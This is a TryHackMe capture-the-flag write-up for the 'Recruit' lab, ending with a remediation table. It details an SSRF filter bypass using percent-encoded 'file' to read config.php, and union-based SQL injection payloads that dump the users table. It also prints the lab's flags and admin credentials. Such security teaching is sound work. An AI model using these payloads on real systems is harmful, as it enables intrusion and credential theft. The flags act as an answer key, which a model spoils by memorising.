# Recruit — TryHackMe Writeup

## Overview

**Recruit** is a web application penetration testing lab hosted on TryHackMe. The target application is a fictional recruitment portal that allows HR staff to manage candidate applications and administrators to oversee hiring decisions. The goal is to gain an initial foothold as a normal user, escalate privileges, and ultimately authenticate as an administrator.

**Vulnerabilities exploited:**
- Server-Side Request Forgery (SSRF) with filter bypass leading to local file disclosure
- Sensitive information disclosure via exposed configuration file
- SQL Injection (Union-based) leading to full database enumeration and credential theft

**Skills demonstrated:**
- Web application reconnaissance and sitemap enumeration
- SSRF exploitation via URL scheme filter bypass
- Manual SQL injection (column count discovery, UNION-based data extraction)
- Use of `information_schema` for blind database enumeration
- HTTP request crafting and manipulation using Burp Suite Repeater

---

## Reconnaissance

The application presented a simple login portal at the root path:

```
http://<target-ip>/
```

A link labeled **"Access API"** led to `/api.php`, which displayed a public-facing FAQ page describing the Recruit API:

> "The Recruit API is used internally to fetch and process candidate CVs from external sources during the recruitment process."

The FAQ revealed the following critical details:

| Question | Answer |
|---|---|
| How can I fetch a candidate CV using the API? | Endpoint: `/file.php?cv=<URL>` |
| What kind of URLs are supported? | HTTP and HTTPS |
| Are there any security restrictions? | "Requests targeting restricted locations may be blocked by the API." |

This immediately flagged the `cv` parameter on `/file.php` as a strong **SSRF candidate** — an endpoint that fetches attacker-supplied URLs server-side, with an implied (and likely incomplete) blocklist protecting against "restricted locations."

Further enumeration of the site structure (checking for common paths / sitemap) revealed a mail log file:

```
http://<target-ip>/mail/mail.log
```

This log contained an internal email from HR Operations to IT Support confirming the deployment of the portal, and — critically — disclosed operational detail about credential storage:

> "HR login credentials (username: `hr`) are currently stored in the application configuration file (`config.php`) for ease of access during the initial rollout phase."
>
> "Administrator credentials are NOT stored in the application files and are securely maintained within the backend database."

This gave a clear roadmap:
1. Use the SSRF endpoint to read `config.php` and recover HR credentials.
2. Log in as HR to reach the authenticated area.
3. Find a separate vulnerability (likely SQL injection, since admin creds live in the database) to escalate to admin.

---

## Step 1 — SSRF: Confirming the Vulnerability

A basic test confirmed the `cv` parameter fetched external content over HTTP by pointing it at a Python HTTP server hosted on the attacking machine:

```bash
mkdir -p ~/ssrf && cd ~/ssrf
echo "hello from attacker" > test.txt
python3 -m http.server 8000
```

Request:
```
GET /file.php?cv=http://<attacker-ip>:8000/test.txt HTTP/1.1
Host: <target-ip>
```

The response reflected the contents of `test.txt`, confirming the endpoint performs a server-side fetch of attacker-controlled URLs.

## Step 2 — Bypassing the Scheme Filter

A direct attempt to read a local file using the `file://` wrapper was blocked:

```
GET /file.php?cv=file:///var/www/html/config.php HTTP/1.1
```

**Response:**
```
Access denied
```

This confirmed a **blocklist filter** checking for the literal string `file://` in the request. Since URL scheme validation is often performed on the raw (pre-decoded) input string, a simple **partial percent-encoding bypass** was attempted — encoding a single character of the scheme so it does not match the filter's string check but is still correctly decoded by the underlying fetch function:

```
GET /file.php?cv=fil%65:///var/www/html/config.php HTTP/1.1
```

Here, `%65` is the URL-encoded representation of the letter `e`. The filter's `strpos($url, 'file://')` style check never sees the literal substring `file://` (it sees `fil%65://`), so the check passes — but PHP's stream wrapper handling decodes `%65` back to `e` before opening the file, successfully bypassing the restriction.

**Result:** The raw source of `config.php` was returned in full.

```php
<?php
/*
|--------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------
*/

$APP_NAME     = 'Recruit';
$APP_ENV      = 'production';
$APP_VERSION  = '1.2.4';
$APP_DEBUG    = false;

/*
|--------------------------------------------------------------------
| HR Credentials (Temporary — Initial Rollout Phase)
|--------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------
*/

$API_ENABLED  = true;
$API_VERSION  = 'v1';
```

This confirmed the HR password: `hrpassword123`, matching the username `hr` referenced in the mail log.

---

## Step 3 — Initial Foothold: Logging in as HR

Using the credentials recovered from `config.php`:

```
Username: hr
Password: hrpassword123
```

Login succeeded, granting access to `/dashboard.php`, which displayed a "Candidate Applications" table along with the first flag:

```
HR Flag: THM{LOGGED_IN_USER}
```

The dashboard also included a **candidate name search feature** (`GET /dashboard.php?search=...`), which became the next target.

---

## Step 4 — SQL Injection Discovery

A boolean-based test was used to confirm the `search` parameter was vulnerable to SQL injection.

**False condition (payload designed to break the query logically):**
```
GET /dashboard.php?search=nonexistentname' AND '1'='2 HTTP/1.1
```
**Result:** Empty candidate table — confirming the injected condition was evaluated directly by the database rather than being treated as a literal string.

Further testing with an intentionally malformed payload confirmed the application does **not** suppress SQL errors:

```
GET /dashboard.php?search=nonexistentname' ORDER BY 10-- - HTTP/1.1
```

**Response:**
```
SQL Error: Unknown column '10' in 'order clause'
```

This verbose error disclosure made column-count enumeration trivial.

## Step 5 — Determining Column Count

Using `ORDER BY` to binary search the number of columns returned by the underlying query:

| Payload | Result |
|---|---|
| `ORDER BY 2` | Clean (no error) |
| `ORDER BY 4` | Clean (no error) |
| `ORDER BY 5` | SQL Error |
| `ORDER BY 6` | SQL Error |

**Conclusion:** The query selects exactly **4 columns**.

## Step 6 — Confirming UNION SELECT and Injection Points

```
GET /dashboard.php?search=nonexistentname' UNION SELECT 1,2,3,4-- - HTTP/1.1
```

The response rendered a new table row displaying `1 | 2 | 3 | 4` directly in the ID / Name / Position / Status columns — confirming that column 2 (mapped to "Name") and column 3 (mapped to "Position") were both reflected as visible text, making them ideal targets for data extraction.

## Step 7 — Enumerating Database Tables

```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Result:**
```
candidates
users
```

The `users` table was the clear target for administrator credentials.

## Step 8 — Extracting Admin Credentials

Rather than enumerate the `users` table's column names first, a `GROUP_CONCAT` payload was used directly to dump the entire user table's `username` and `password` values into a single response row:

```sql
' UNION SELECT 1,group_concat(password,':',username SEPARATOR '<br>'),3,4 FROM users-- -
```

**Result:**
```
admin@001admin:admin
```

Parsed as `password:username`:

- **Username:** `admin`
- **Password:** `admin@001admin`

---

## Step 9 — Privilege Escalation: Logging in as Administrator

Using the recovered credentials:

```
Username: admin
Password: admin@001admin
```

Login succeeded with full administrator access, revealing the final flag:

```
Admin Flag: THM{LOGGED_IN_ADM1N1}
```

---

## Root Causes & Remediation

| Vulnerability | Root Cause | Remediation |
|---|---|---|
| SSRF (`/file.php?cv=`) | Blocklist-based scheme filtering on raw, undecoded input | Use an allowlist of permitted protocols (http/https only) applied *after* full URL normalization/decoding; validate resolved IP is not internal/private (SSRF-safe HTTP client / DNS pinning) |
| Sensitive file disclosure | Hardcoded plaintext credentials stored in a web-accessible config file, combined with the SSRF flaw | Never store credentials in source-controlled config files; use environment variables or a secrets manager; ensure the SSRF fix prevents `file://` and other non-network schemes entirely |
| Exposed internal mail log | Internal operational logs left accessible under the web root | Remove logs/backups from publicly served directories; enforce `.gitignore`/deployment hygiene |
| SQL Injection (`search` parameter) | User input concatenated directly into a raw SQL query | Use parameterized queries / prepared statements exclusively; never build SQL via string concatenation |
| Verbose SQL error disclosure | Database errors returned directly to the client | Disable detailed error output in production (`display_errors = Off`); log errors server-side only |
| Weak admin credential hygiene | Predictable/weak password (`admin@001admin`) | Enforce strong password policies; consider MFA for administrative accounts |

---

## Timeline Summary

1. Discovered `/api.php` FAQ describing the `cv` SSRF-prone parameter.
2. Located an exposed `mail.log` disclosing that HR credentials live in `config.php`.
3. Bypassed the SSRF scheme filter (`file://` → `fil%65://`) to read `config.php` via `/file.php?cv=`.
4. Recovered HR credentials and logged in, capturing the user flag.
5. Identified SQL injection in the dashboard's `search` parameter via boolean-based testing and verbose SQL errors.
6. Enumerated database structure using `information_schema` (tables → `users`).
7. Extracted admin credentials via a `UNION SELECT` + `GROUP_CONCAT` payload.
8. Logged in as administrator, capturing the final flag.

---

## Flags

- **User flag:** `THM{LOGGED_IN_USER}`
- **Admin flag:** `THM{LOGGED_IN_ADM1N1}`

---

*Writeup by Mohanad Ahmed
